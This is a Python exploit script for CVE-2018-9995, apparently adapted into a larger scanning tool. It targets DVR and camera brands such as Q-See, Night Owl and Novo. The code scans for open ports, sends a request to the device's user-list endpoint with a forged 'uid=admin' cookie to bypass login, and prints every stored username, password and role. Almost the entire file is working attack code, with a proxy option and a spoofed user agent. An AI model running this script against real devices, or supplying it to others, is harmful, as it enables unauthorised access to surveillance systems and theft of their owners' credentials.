# -*- coding: utf-8 -*
'''
[*] Exploit Title:       "Gets DVR Credentials" 
[*] CVE:                 CVE-2018-9995
[*] CVSS Base Score v3:  7.3 / 10
[*] CVSS Vector String:  CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
[*] Date:                09/04/2018
[*] Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )

Original github address: https://github.com/ezelf/CVE-2018-9995_dvr_credentials

the camera equipments which could be attack:
    Novo
    CeNova
    QSee
    Pulnix
    XVR 5 in 1 (title: "XVR Login")
    Securus,  - Security. Never Compromise - 
    Night OWL
    DVR Login
    HVR Login
    MDVR Login
'''
# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests
class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

banner = '''
                             __..--.._
      .....              .--~  .....  `.
    .":    "`-..  .    .' ..-'"    :". `
    ` `._ ` _.'`"(     `-"'`._ ' _.' '
         ~~~      `.          ~~~
                  .'
                 /
                (
                 ^---'
 [*] @capitan_alfa
'''

details = ''' 
 # Exploit Title:   DVRs; Credentials Exposed
 # Date:            09/04/2018
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
 # version: 1.2
'''
proxy=None
def set_agent(p):#设置代理
    global proxy
    proxy=p
class exp:
    def __init__(self,HST:str,port,agent=None):
        if not port:        #若未指定端口则自动扫描
            from ..sniff import ScanPort_ as s
            ports_=[]
            ports_=s(HST).start()
            print(ports_)
            for p in ports_:
                self._run(HST,str(p))#各个端口均进行测试
        else:
            self._run(HST,str(port))
        
    def _run(self,HST:str,port):
        self.headers = {}        
        self.fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
        self.host        =   "http://"+HST+":"+str(port)+"/"     
        print(Colors.GREEN+banner+Colors.DEFAULT)
        print(Colors.ORANGE+"now is try:"+self.host+Colors.BR_COLOUR)
        try:
            rX = requests.get(self.fullHost_1,headers=self.makeReqHeaders(xCookie="admin"),proxies=proxy,timeout=10.000)
            try:
                dataJson = json.loads(rX.text)
                totUsr = len(dataJson["list"])
            except Exception as e:
                print(" [+] Error: "+str(e))
                print(" [>] json: "+str(rX))
                exit()
            print(Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(self.host)+Colors.GREEN)
            print(" [+] Port: \t\t"+Colors.ORANGE+str(port)+Colors.DEFAULT)
            print(Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT)
            print(" ")
            try:

                hdUsr  = Colors.GREEN + "Username" + Colors.DEFAULT
                hdPass = Colors.GREEN + "Password" + Colors.DEFAULT
                hdRole = Colors.GREEN + "Role ID"  + Colors.DEFAULT
                print(f"{hdUsr}\t{hdPass}\t{hdRole}")
                for obj in range(0,totUsr):
                    _usuario    = dataJson["list"][obj]["uid"]
                    _password   = dataJson["list"][obj]["pwd"]
                    _role       = dataJson["list"][obj]["role"]
                    print(f"{_usuario}\t\t{_password}\t\t\t{_role}")
            except Exception as e:
                print(" [!]: "+str(e))
                print(" [+] "+ str(dataJson))
            print(" ")
        except Exception as e:
            #print(e)
            print(Colors.RED+" [+] Timed out\n"+Colors.DEFAULT)    

    def makeReqHeaders(self,xCookie):
        self.headers["Host"]             =  self.host
        self.headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
        self.headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
        self.headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
        self.headers["Connection"]       = "close"
        self.headers["Content-Type"]     = "text/html"
        self.headers["Cookie"]           = "uid="+xCookie

        return self.headers

   
   
   
   
